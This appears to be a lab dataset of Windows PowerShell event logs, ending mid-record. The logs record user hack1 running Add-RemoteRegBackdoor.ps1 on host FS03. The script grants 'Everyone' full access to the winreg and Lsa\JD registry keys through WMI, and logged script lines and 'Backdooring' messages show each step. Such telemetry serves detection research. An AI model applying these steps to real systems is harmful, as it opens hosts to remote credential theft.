[
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54705",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>        Write-Verbose \"[$Computer : $Key] Using trustee username '$User'\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1013\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=        Write-Verbose \"[$Computer : $Key] Using trustee username '$User'\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : ] Using trustee username 'Everyone'\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54706",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter \"name='RemoteRegistry'\" @WmiArguments\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1015\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter \"name='RemoteRegistry'\" @WmiArguments\n</string>\n<string>CommandInvocation(Get-WmiObject): \"Get-WmiObject\"\nParameterBinding(Get-WmiObject): name=\"Class\"; value=\"Win32_Service\"\nParameterBinding(Get-WmiObject): name=\"Filter\"; value=\"name='RemoteRegistry'\"\nParameterBinding(Get-WmiObject): name=\"ComputerName\"; value=\"FS03\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54707",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer] Attaching to remote registry through StdRegProv\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1017\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer] Attaching to remote registry through StdRegProv\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03] Attaching to remote registry through StdRegProv\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54708",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter \"__CLASS = 'StdRegProv'\" @WmiArguments\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1019\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter \"__CLASS = 'StdRegProv'\" @WmiArguments\n</string>\n<string>CommandInvocation(Get-WmiObject): \"Get-WmiObject\"\nParameterBinding(Get-WmiObject): name=\"Namespace\"; value=\"root/default\"\nParameterBinding(Get-WmiObject): name=\"Class\"; value=\"Meta_Class\"\nParameterBinding(Get-WmiObject): name=\"Filter\"; value=\"__CLASS = 'StdRegProv'\"\nParameterBinding(Get-WmiObject): name=\"ComputerName\"; value=\"FS03\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54709",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Backdooring started for key\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1021\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Backdooring started for key\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Backdooring started for key\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54710",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1023\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54711",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1025\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n</string>\n<string>CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Management.ManagementClass\"\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"win32_Ace\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54712",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Creating the trustee WMI object with user '$User'\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1027\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Creating the trustee WMI object with user '$User'\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Creating the trustee WMI object with user 'Everyone'\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54713",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1029\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n</string>\n<string>CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Management.ManagementClass\"\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"win32_Trustee\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54714",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Applying Trustee to new Ace\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1031\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Applying Trustee to new Ace\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Applying Trustee to new Ace\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54715",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1033\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Calling SetSecurityDescriptor on the key with the newly created Ace\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54716",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Backdooring completed for key\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1035\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Backdooring completed for key\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Backdooring completed for key\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54717",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Backdooring started for key\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1037\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Backdooring started for key\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Backdooring started for key\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54718",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1039\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54719",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1041\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n</string>\n<string>CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Management.ManagementClass\"\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"win32_Ace\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54720",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Creating the trustee WMI object with user '$User'\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1043\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Creating the trustee WMI object with user '$User'\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Creating the trustee WMI object with user 'Everyone'\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54721",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1045\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n</string>\n<string>CommandInvocation(New-Object): \"New-Object\"\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Management.ManagementClass\"\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"win32_Trustee\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54722",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": "<string>            Write-Verbose \"[$Computer : $Key] Applying Trustee to new Ace\"\n</string>\n<string>\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1047\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \"[$Computer : $Key] Applying Trustee to new Ace\"\n</string>\n<string>CommandInvocation(Write-Verbose): \"Write-Verbose\"\nParameterBinding(Write-Verbose): name=\"Message\"; value=\"[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Applying Trustee to new Ace\"\n</string>",
                "Binary": null
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "PowerShell"
                },
                "EventID": {
                    "@Qualifiers": "0",
                    "#text": "800"
                },
                "Level": "4",
                "Task": "8",
                "Keywords": "0x0080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-12-09 19:54:03+00:00"
                },
                "EventRecordID": "54723",
                "Channel": "Windows PowerShell",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
